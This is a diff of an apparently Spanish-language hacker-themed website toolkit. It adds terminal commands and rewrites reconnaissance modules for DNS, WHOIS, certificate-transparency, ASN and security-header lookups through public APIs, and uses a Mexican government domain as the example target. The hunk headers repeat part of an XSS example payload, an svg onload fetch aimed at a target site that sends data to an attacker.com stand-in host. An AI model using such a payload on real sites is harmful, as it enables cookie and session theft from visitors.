@@ -1079,7 +1079,7 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
       <span style="color:rgba(0,255,65,.3)"> // todo gratis, sin API key</span>
     </div>
     <div class="tk-row">
-      <input class="tk-input" id="recon-target" placeholder="example.com  ó  8.8.8.8" style="flex:3;font-size:.85rem;"/>
+      <input class="tk-input" id="recon-target" placeholder="queretaro.gob.mx  ó  8.8.8.8" style="flex:3;font-size:.85rem;"/>
       <button class="tk-btn" onclick="tkRecon()" style="min-width:120px;font-size:.8rem;letter-spacing:2px;">▶ RECON</button>
     </div>
     <div class="tk-row" style="gap:6px;flex-wrap:wrap;margin-top:4px;">
@@ -1114,7 +1114,7 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
       <span id="th-bulk-label" style="font-family:var(--font);font-size:.6rem;color:rgba(0,255,65,.3);margin-left:8px;"></span>
     </div>
     <div id="th-bulk-area" style="display:none;margin-bottom:6px;">
-      <textarea id="th-bulk-input" placeholder="Una IP, dominio, URL o hash por línea&#10;189.141.173.187&#10;&#10;https://example.com"
+      <textarea id="th-bulk-input" placeholder="Una IP, dominio, URL o hash por línea&#10;189.141.173.187&#10;queretaro.gob.mx&#10;https://example.com"
         style="width:100%;height:90px;background:var(--bg);border:1px solid rgba(0,255,65,.2);color:rgba(0,255,65,.8);
                font-family:var(--font);font-size:.7rem;padding:8px;resize:vertical;border-radius:4px;outline:none;"></textarea>
       <button class="tk-btn" onclick="runBulkScan()" style="margin-top:4px;font-size:.75rem;width:100%;">&#x2B21; EJECUTAR BULK SCAN</button>
@@ -1832,10 +1832,51 @@ async function execCmd(raw){
     case 'y000': solveFlag('ctf5'); return '<span class="t-ok">Encontraste el comando oculto.</span>\n<span class=\"t-flag\">"+( window._F?window._F.f5:"???")+"</span>';
     case 'konami': document.getElementById('egg-overlay').classList.add('show'); solveFlag('ctf6'); return '<span class="t-ok">KONAMI activado.</span>';
     case 'matrix': matIntense=true; setTimeout(function(){matIntense=false;},10000); return '<span class="t-ok">// Matrix rain intensificada por 10s</span>';
-    case 'dns': return '<span class="t-info">Usa el panel RECON en la sección TOOLKIT para consultas DNS completas.</span>';
-    case 'ip': return '<span class="t-info">Usa el panel RECON en la sección TOOLKIT para geolocalización de IP.</span>';
+    case 'dns':
+      if(!args) return '<span class="t-err">Uso: dns &lt;dominio&gt;</span>';
+      return fetch('https://dns.google/resolve?name='+encodeURIComponent(args)+'&type=A',{signal:AbortSignal.timeout(6000)})
+        .then(function(r){return r.json();})
+        .then(function(d){
+          var ips=(d.Answer||[]).filter(function(a){return a.type===1;}).map(function(a){return a.data;});
+          if(!ips.length) return '<span style="color:var(--amber)">// '+escH(args)+': Sin registros A (NXDOMAIN o sin IPv4)</span>';
+          var out='<span style="color:var(--g)">// DNS A → '+escH(args)+'</span>\n';
+          ips.forEach(function(ip){out+='  <span style="color:var(--cyan)">'+escH(ip)+'</span>\n';});
+          return out;
+        }).catch(function(e){return '<span class="t-err">dns error: '+escH(e.message)+'</span>';});
+    case 'ip':
+      var target=args||'';
+      var url=target?'https://ipapi.co/'+encodeURIComponent(target)+'/json/':'https://ipapi.co/json/';
+      return fetch(url,{signal:AbortSignal.timeout(8000)})
+        .then(function(r){return r.json();})
+        .then(function(d){
+          if(d.error) throw new Error(d.reason||'error');
+          return '<span style="color:var(--g)">// '+escH(d.ip)+'</span>\n'+
+            '  País   : '+escH(d.country_name||'—')+' ('+escH(d.country_code||'')+')'+'\n'+
+            '  Ciudad : '+escH((d.city||'—')+', '+(d.region||''))+'\n'+
+            '  ASN    : '+escH(d.asn||'—')+'\n'+
+            '  Org    : '+escH(d.org||'—')+'\n';
+        }).catch(function(e){return '<span class="t-err">ip error: '+escH(e.message)+'</span>';});
     case 'myip': tkMyIP(); return null;
-    case 'ssl': return '<span class="t-info">Usa el panel RECON → módulo SSL para ver certificados.</span>';
+    case 'ssl':
+      if(!args) return '<span class="t-err">Uso: ssl &lt;dominio&gt;</span>';
+      return fetch('https://crt.sh/?q='+encodeURIComponent(args)+'&output=json',{signal:AbortSignal.timeout(12000)})
+        .then(function(r){return r.json();})
+        .then(function(data){
+          if(!data||!data.length) return '<span style="color:var(--amber)">// Sin certs en CT logs para: '+escH(args)+'</span>';
+          data.sort(function(a,b){return new Date(b.entry_timestamp)-new Date(a.entry_timestamp);});
+          var cert=data[0];
+          var now=new Date();
+          var expiry=cert.not_after?new Date(cert.not_after):null;
+          var days=expiry?Math.floor((expiry-now)/86400000):null;
+          var col=!expiry?'var(--amber)':days<0?'var(--red)':days<30?'var(--amber)':'var(--g)';
+          var out='<span style="color:var(--g)">// SSL → '+escH(args)+'</span>\n';
+          out+='  CN      : <span style="color:var(--cyan)">'+escH(cert.common_name||'—')+'</span>\n';
+          out+='  Issuer  : '+escH((cert.issuer_name||'—').substring(0,60))+'\n';
+          out+='  Expira  : <span style="color:'+col+'">'+escH(cert.not_after||'—')+'</span>';
+          if(days!==null) out+=' <span style="color:'+col+'">('+( days<0?'EXPIRADO':days+' días')+')</span>';
+          out+='\n  Certs CT: '+data.length+' encontrados\n';
+          return out;
+        }).catch(function(e){return '<span class="t-err">ssl error: '+escH(e.message)+'</span>';});
     default: return '<span class="t-err">bash: '+escH(cmd)+': command not found -- escribe <span class="t-cmd">help</span></span>';
   }
 }
@@ -2784,50 +2825,49 @@ async function reconPorts(ip){
 async function reconWHOIS(domain){
   var out=reconSection('WHOIS — '+domain);
   try{
-    var r=await fetch('https://api.whois.vu/?q='+encodeURIComponent(domain),{signal:AbortSignal.timeout(10000)});
+    // who-dat.as93.net — free, no-CORS, no API key
+    var r=await fetch('https://who-dat.as93.net/'+encodeURIComponent(domain),{signal:AbortSignal.timeout(10000)});
+    if(!r.ok) throw new Error('HTTP '+r.status);
     var d=await r.json();
-    var fields=[['domainName','Dominio'],['registrar','Registrar'],['creationDate','Creado'],
-                ['expirationDate','Expira'],['updatedDate','Actualizado'],
-                ['registrantName','Registrant'],['registrantOrganization','Organización'],
-                ['registrantCountry','País'],['registrantEmail','Email']];
+    if(d.error) throw new Error(d.error);
+    var reg=d.registrar||{};
+    var dates=d.important_dates||{};
+    var contacts=d.contacts||{};
+    var registrant=(contacts.registrant&&contacts.registrant[0])||{};
+    var fields=[
+      ['Dominio',     d.domain||domain],
+      ['Registrar',   reg.name||'—'],
+      ['IANA ID',     reg.iana_id||'—'],
+      ['Creado',      dates.created||'—'],
+      ['Actualizado', dates.updated||'—'],
+      ['Expira',      dates.expiry||'—'],
+      ['Status',      (d.domain_status||[]).slice(0,2).join(', ')||'—'],
+      ['DNSSEC',      d.dnssec||'—'],
+      ['Registrant',  registrant.name||'—'],
+      ['Org',         registrant.organisation||'—'],
+      ['País',        registrant.country||'—'],
+    ];
     var found=0;
     fields.forEach(function(f){
-      var v=d[f[0]];
-      if(!v||v==='REDACTED FOR PRIVACY') return;
-      if(Array.isArray(v)) v=v[0];
-      v=String(v).trim();
-      if(!v) return;
+      if(!f[1]||f[1]==='—') return;
+      out+='  <span style="color:var(--cyan)">'+escH(f[0].padEnd(12))+':</span> '+escH(String(f[1]).substring(0,60))+'\n';
       found++;
-      var isDate=f[0].toLowerCase().includes('date');
-      out+='  <span style="color:var(--amber)">'+f[1]+':</span> <span style="color:'+(isDate?'var(--g)':'var(--cyan)')+'">'+escH(v.substring(0,80))+'</span>\n';
     });
-    if(d.status){
-      var arr=Array.isArray(d.status)?d.status:[d.status];
-      out+='  <span style="color:var(--amber)">Status:</span>  ';
-      arr.slice(0,4).forEach(function(s,i){
-        out+=(i?' ':'')+'<span style="color:var(--g)">'+escH(String(s))+'</span>';
-      });
-      out+='\n'; found++;
+    if(!found) throw new Error('Sin datos WHOIS para este dominio');
+    // NS
+    var ns=d.name_servers||[];
+    if(ns.length){
+      out+='\n  <span style="color:var(--cyan)">Nameservers:</span>\n';
+      ns.slice(0,4).forEach(function(n){out+='    '+escH(n)+'\n';});
     }
-    if(d.nameServers){
-      var ns=Array.isArray(d.nameServers)?d.nameServers:[d.nameServers];
-      out+='  <span style="color:var(--amber)">NS:</span>  ';
-      ns.slice(0,4).forEach(function(n){out+='<span style="color:var(--cyan)">'+escH(String(n).toLowerCase())+'</span>  ';});
-      out+='\n'; found++;
-    }
-    if(found===0){
-      out+='  <span style="color:rgba(0,255,65,.4)">Datos no públicos para este TLD (.gob.mx restringe info)</span>\n';
-      out+='  <a href="https://www.whois.com/whois/'+encodeURIComponent(domain)+'" target="_blank" style="color:var(--amber);text-decoration:none;">  → whois.com ↗</a>\n';
-      out+='  <a href="https://lookup.icann.org/en/lookup?name='+encodeURIComponent(domain)+'" target="_blank" style="color:var(--amber);text-decoration:none;">  → ICANN ↗</a>\n';
-      if(domain.endsWith('.mx')){
-        out+='  <a href="https://www.nic.mx/registro/whois.jsf?d='+encodeURIComponent(domain)+'" target="_blank" style="color:var(--amber);text-decoration:none;">  → NIC México ↗</a>\n';
-      }
-    }
-  }catch(e){out+=reconErr('WHOIS',e);}
+    out+='\n  <span style="color:rgba(0,255,65,.3)">// Fuente: who-dat.as93.net (sin API key)</span>\n';
+  }catch(e){
+    out+=reconErr('WHOIS',e);
+    out+='  <a href="https://who.is/whois/'+encodeURIComponent(domain)+'" target="_blank" style="color:var(--amber);font-size:.65rem;">→ who.is ↗</a>\n';
+  }
   return out;
 }
 
-// ── MODULE: SUBDOMAINS ──
 async function reconSubs(domain){
   var out=reconSection('SUBDOMAINS — '+domain);
   try{
@@ -2859,104 +2899,116 @@ async function reconSubs(domain){
 
 // ── MODULE: SSL/CERTS ──
 async function reconSSL(domain){
-  var out=reconSection('SSL/TLS CERTS — '+domain);
+  var out=reconSection('SSL / TLS — '+domain);
   try{
-    var r=await fetch('https://crt.sh/?q='+encodeURIComponent(domain)+'&output=json',{signal:AbortSignal.timeout(10000)});
-    var certs=await r.json();
-    if(!certs||!certs.length){out+='  Sin certificados en crt.sh\n';return out;}
-    var latest=certs[0];
-    var exp=new Date(latest.not_after), iss=new Date(latest.not_before);
-    var days=Math.floor((exp-new Date())/86400000);
-    var stateColor=days>30?'var(--g)':days>0?'var(--amber)':'var(--red)';
-    out+='  <span style="color:var(--amber)">Emisor:</span>    '+escH(latest.issuer_name||'?').replace(/,/g,' ').substring(0,60)+'\n';
-    out+='  <span style="color:var(--cyan)">Sujeto:</span>    '+escH(latest.common_name||latest.name_value||'?')+'\n';
-    out+='  <span style="color:var(--cyan)">Emitido:</span>   '+iss.toLocaleDateString('es-MX')+'\n';
-    out+='  <span style="color:var(--cyan)">Expira:</span>    '+exp.toLocaleDateString('es-MX')+'\n';
-    out+='  <span style="color:'+stateColor+'">Estado:</span>    '+(days>0?'VÁLIDO — '+days+' días restantes':'EXPIRADO hace '+Math.abs(days)+' días')+'\n';
-    out+='\n  <span style="color:rgba(0,255,65,.6)">Historial reciente ('+Math.min(certs.length,5)+'/'+certs.length+' certs):</span>\n';
-    certs.slice(0,5).forEach(function(cert){
-      out+='  <span style="color:rgba(0,255,65,.3)">'+cert.id+'</span>  <span style="color:var(--cyan)">'+escH(cert.common_name||cert.name_value||'?')+'</span>  <span style="color:rgba(0,255,65,.4)">'+escH((cert.not_before||'').substring(0,10))+'</span>\n';
-    });
-    out+='  <span style="color:rgba(0,255,65,.3)">// '+certs.length+' certs en CT logs</span>\n';
-  }catch(e){out+=reconErr('SSL',e);}
+    // crt.sh for cert details — exact domain match
+    var r=await fetch('https://crt.sh/?q='+encodeURIComponent(domain)+'&output=json',
+      {signal:AbortSignal.timeout(12000)});
+    if(!r.ok) throw new Error('HTTP '+r.status);
+    var data=await r.json();
+    if(!data||!data.length) throw new Error('Sin certificados en CT logs');
+
+    // Sort by most recent logged
+    data.sort(function(a,b){return new Date(b.entry_timestamp)-new Date(a.entry_timestamp);});
+    var cert=data[0];
+    var now=new Date();
+    var notBefore=cert.not_before?new Date(cert.not_before):null;
+    var notAfter=cert.not_after?new Date(cert.not_after):null;
+    var isExpired=notAfter&&notAfter<now;
+    var daysLeft=notAfter?Math.floor((notAfter-now)/86400000):null;
+
+    // Main cert info
+    out+='  <span style="color:var(--cyan)">CN         :</span> <span style="color:var(--g)">'+escH(cert.common_name||'—')+'</span>\n';
+    out+='  <span style="color:var(--cyan)">Issuer     :</span> '+escH((cert.issuer_name||'—').substring(0,70))+'\n';
+    out+='  <span style="color:var(--cyan)">Not Before :</span> '+escH(cert.not_before||'—')+'\n';
+    var expColor=isExpired?'var(--red)':daysLeft!==null&&daysLeft<30?'var(--amber)':'rgba(0,255,65,.8)';
+    out+='  <span style="color:var(--cyan)">Not After  :</span> <span style="color:'+expColor+'">'+escH(cert.not_after||'—')+'</span>';
+    if(daysLeft!==null) out+=' <span style="color:'+expColor+'">('+( isExpired?'EXPIRADO':''+daysLeft+' días restantes')+')</span>';
+    out+='\n';
+    out+='  <span style="color:var(--cyan)">Logged     :</span> '+escH(cert.entry_timestamp||'—')+'\n\n';
+
+    // SANs (name_value contains newline-separated SANs)
+    var sans=(cert.name_value||'').split('\n').filter(function(s){return s.trim();});
+    var uniqueSans=[...new Set(sans)].slice(0,15);
+    if(uniqueSans.length){
+      out+='  <span style="color:var(--cyan)">SANs ('+uniqueSans.length+'):</span>\n';
+      uniqueSans.forEach(function(s){
+        var isWild=s.startsWith('*.');
+        out+='    <span style="color:'+(isWild?'var(--amber)':'rgba(0,255,65,.7)')+'">'+escH(s)+'</span>\n';
+      });
+      out+='\n';
+    }
+
+    // CT log summary
+    var totalCerts=data.length;
+    var expired=data.filter(function(d){return d.not_after&&new Date(d.not_after)<now;}).length;
+    out+='  <span style="color:rgba(0,255,65,.4)">// CT Logs: '+totalCerts+' certificados — '+expired+' expirados</span>\n';
+    out+='  <a href="https://crt.sh/?q='+encodeURIComponent(domain)+'" target="_blank" style="color:rgba(0,255,65,.4);font-size:.65rem;">→ Ver todos en crt.sh ↗</a>  ';
+    out+='<a href="https://www.ssllabs.com/ssltest/analyze.html?d='+encodeURIComponent(domain)+'" target="_blank" style="color:rgba(0,255,65,.4);font-size:.65rem;">→ SSL Labs ↗</a>\n';
+  }catch(e){
+    out+=reconErr('SSL',e);
+    out+='  <a href="https://www.ssllabs.com/ssltest/analyze.html?d='+encodeURIComponent(domain)+'" target="_blank" style="color:var(--amber);font-size:.65rem;">→ SSL Labs ↗</a>\n';
+  }
   return out;
 }
 
-// ── MODULE: BGP/ASN ──
 async function reconBGP(ip){
   var out=reconSection('BGP / ASN — '+ip);
   try{
-    var r=await fetch('https://api.bgpview.io/ip/'+encodeURIComponent(ip),{signal:AbortSignal.timeout(10000)});
+    var r=await fetch('https://ipapi.co/'+encodeURIComponent(ip)+'/json/',{signal:AbortSignal.timeout(8000)});
     var d=await r.json();
-    if(d.status!=='ok') throw new Error(d.status_message||'error');
-    var ip2=d.data;
-    if(ip2.ptr_record) out+='  <span style="color:var(--amber)">PTR:</span>     '+escH(ip2.ptr_record)+'\n';
-    if(ip2.prefixes&&ip2.prefixes.length){
-      out+='  <span style="color:var(--cyan)">Prefixes:</span>\n';
-      ip2.prefixes.slice(0,4).forEach(function(p){
-        out+='    <span style="color:var(--g)">'+escH(p.prefix||'')+'</span>';
-        if(p.asn) out+='  AS<span style="color:var(--amber)">'+p.asn.asn+'</span> '+escH((p.asn.name||'').substring(0,40));
-        if(p.country_code) out+='  <span style="color:var(--cyan)">('+p.country_code+')</span>';
-        out+='\n';
-        if(p.description) out+='      <span style="color:rgba(0,255,65,.4)">'+escH(p.description.substring(0,60))+'</span>\n';
-      });
+    if(d.error) throw new Error(d.reason||'ipapi error');
+    out+='  <span style="color:var(--cyan)">ASN     :</span> <span style="color:var(--g)">'+escH(d.asn||'—')+'</span>\n';
+    out+='  <span style="color:var(--cyan)">Org     :</span> '+escH(d.org||'—')+'\n';
+    out+='  <span style="color:var(--cyan)">País    :</span> '+escH((d.country_name||'—')+' ('+( d.country_code||'')+')')+'\n';
+    out+='  <span style="color:var(--cyan)">Ciudad  :</span> '+escH((d.city||'—')+', '+(d.region||''))+'\n';
+    out+='  <span style="color:var(--cyan)">Red     :</span> '+escH(d.network||'—')+'\n';
+    out+='  <span style="color:var(--cyan)">Carrier :</span> '+escH(d.org||'—')+'\n';
+    out+='\n';
+    if(d.asn){
+      var asn=d.asn.replace('AS','');
+      out+='  <span style="color:rgba(0,255,65,.3)">// Prefixes y peers:</span>\n';
+      out+='  <a href="https://bgp.tools/as/'+encodeURIComponent(asn)+'" target="_blank" style="color:rgba(0,255,65,.5);font-size:.65rem;">bgp.tools/AS'+escH(asn)+' ↗</a>  ';
+      out+='<a href="https://bgp.he.net/AS'+encodeURIComponent(asn)+'" target="_blank" style="color:rgba(0,255,65,.5);font-size:.65rem;">bgp.he.net ↗</a>  ';
+      out+='<a href="https://ipinfo.io/AS'+encodeURIComponent(asn)+'" target="_blank" style="color:rgba(0,255,65,.5);font-size:.65rem;">ipinfo.io ↗</a>\n';
     }
-    if(ip2.rir_allocation){
-      var rir=ip2.rir_allocation;
-      out+='\n  <span style="color:var(--cyan)">RIR:</span>     '+escH(rir.rir_name||'?')+'\n';
-      out+='  <span style="color:var(--cyan)">Prefix:</span>  '+escH(rir.prefix||'?')+'\n';
-      out+='  <span style="color:var(--cyan)">País:</span>    '+escH(rir.country_code||'?')+'\n';
-      out+='  <span style="color:var(--cyan)">Desde:</span>   '+escH(rir.date_allocated||'?')+'\n';
-    }
-    out+='  <span style="color:rgba(0,255,65,.3)">// Fuente: bgpview.io (sin key)</span>\n';
   }catch(e){out+=reconErr('BGP',e);}
   return out;
 }
 
-// ── MODULE: HTTP SECURITY HEADERS ──
 async function reconHeaders(domain){
   var out=reconSection('SECURITY HEADERS — '+domain);
   try{
-    var apiBase='https://http-observatory.security.mozilla.org/api/v1/analyze?host='+encodeURIComponent(domain);
-    await fetch(apiBase+'&hidden=true',{method:'POST',signal:AbortSignal.timeout(6000)});
-    // Poll
+    // MDN HTTP Observatory API v2
+    var scanUrl='https://observatory-api.mdn.mozilla.net/api/v2/scan?host='+encodeURIComponent(domain);
+    // Trigger scan
+    await fetch(scanUrl,{method:'POST',signal:AbortSignal.timeout(8000)}).catch(function(){});
+    // Poll up to 30s
     var result=null;
-    for(var i=0;i<10;i++){
-      await new Promise(function(r){setTimeout(r,3000);});
-      var r=await fetch(apiBase,{signal:AbortSignal.timeout(6000)});
+    for(var i=0;i<8;i++){
+      await new Promise(function(r){setTimeout(r,3500);});
+      var r=await fetch(scanUrl,{signal:AbortSignal.timeout(8000)});
+      if(!r.ok) throw new Error('HTTP '+r.status);
       var d=await r.json();
-      if(d.state==='FINISHED'||d.state==='ABORTED'){result=d;break;}
-      if(d.state==='FAILED') throw new Error('Scan fallido');
+      if(d.error) throw new Error(d.error);
+      if(d.grade){result=d;break;}
     }
-    if(!result) throw new Error('Timeout Observatory');
+    if(!result) throw new Error('Timeout Observatory (>30s)');
     var grade=result.grade||'?';
     var score=result.score||0;
-    var gc=grade==='A+'||grade==='A'?'var(--g)':grade[0]==='B'?'var(--amber)':'var(--red)';
-    out+='  Grade: <span style="color:'+gc+';font-size:1.2rem;font-weight:700;">'+escH(grade)+'</span>  Score: <span style="color:'+gc+'">'+score+'/100</span>\n';
-    if(result.tests_passed!==undefined){
+    var gc=grade.startsWith('A')?'var(--g)':grade.startsWith('B')?'var(--amber)':'var(--red)';
+    out+='  Grade: <span style="color:'+gc+';font-size:1.2rem;font-weight:700;">'+escH(grade)+'</span>';
+    out+='  Score: <span style="color:'+gc+'">'+score+'/100</span>\n';
+    if(result.tests_failed!==undefined){
       out+='  <span style="color:var(--g)">✓ '+result.tests_passed+' passed</span>  ';
-      out+='<span style="color:var(--red)">✗ '+(result.tests_failed||0)+' failed</span>\n\n';
+      out+='<span style="color:var(--red)">✗ '+result.tests_failed+' failed</span>\n\n';
     }
-    // Fetch test details
-    try{
-      var r2=await fetch('https://http-observatory.security.mozilla.org/api/v1/getScanResults?scan='+result.scan_id,{signal:AbortSignal.timeout(6000)});
-      var tests=await r2.json();
-      var keys=['content-security-policy','strict-transport-security','x-frame-options',
-                'x-content-type-options','referrer-policy','cookies','cross-origin-resource-sharing'];
-      keys.forEach(function(k){
-        var t=tests[k]; if(!t) return;
-        var ic=t.pass?'<span style="color:var(--g)">✓</span>':'<span style="color:var(--red)">✗</span>';
-        var pts=t.score_modifier;
-        var pc=pts>0?'var(--g)':pts<0?'var(--red)':'rgba(0,255,65,.4)';
-        out+='  '+ic+' <span style="color:var(--amber)">'+k+'</span> <span style="color:'+pc+'">'+(pts>0?'+':'')+pts+'</span>\n';
-        if(t.result) out+='    <span style="color:rgba(0,255,65,.4)">'+escH(String(t.result).substring(0,70))+'</span>\n';
-      });
-    }catch(ex){}
-    out+='  <a href="https://observatory.mozilla.org/analyze/'+encodeURIComponent(domain)+'" target="_blank" style="color:rgba(0,255,65,.4);text-decoration:none;">  → Mozilla Observatory ↗</a>\n';
-    out+='  <a href="https://securityheaders.com/?q='+encodeURIComponent(domain)+'&followRedirects=on" target="_blank" style="color:rgba(0,255,65,.4);text-decoration:none;">  → SecurityHeaders.com ↗</a>\n';
+    out+='  <a href="https://developer.mozilla.org/en-US/observatory/analyze?host='+encodeURIComponent(domain)+'" target="_blank" style="color:rgba(0,255,65,.4);font-size:.65rem;">→ MDN Observatory ↗</a>  ';
+    out+='<a href="https://securityheaders.com/?q='+encodeURIComponent(domain)+'&followRedirects=on" target="_blank" style="color:rgba(0,255,65,.4);font-size:.65rem;">→ SecurityHeaders.com ↗</a>\n';
   }catch(e){
     out+=reconErr('HEADERS',e);
-    out+='  <a href="https://securityheaders.com/?q='+encodeURIComponent(domain)+'&followRedirects=on" target="_blank" style="color:var(--amber);text-decoration:none;">  → SecurityHeaders.com ↗</a>\n';
+    out+='  <a href="https://developer.mozilla.org/en-US/observatory/analyze?host='+encodeURIComponent(domain)+'" target="_blank" style="color:var(--amber);font-size:.65rem;">→ MDN Observatory ↗</a>  ';
+    out+='<a href="https://securityheaders.com/?q='+encodeURIComponent(domain)+'&followRedirects=on" target="_blank" style="color:var(--amber);font-size:.65rem;">→ SecurityHeaders.com ↗</a>\n';
   }
   return out;
 }
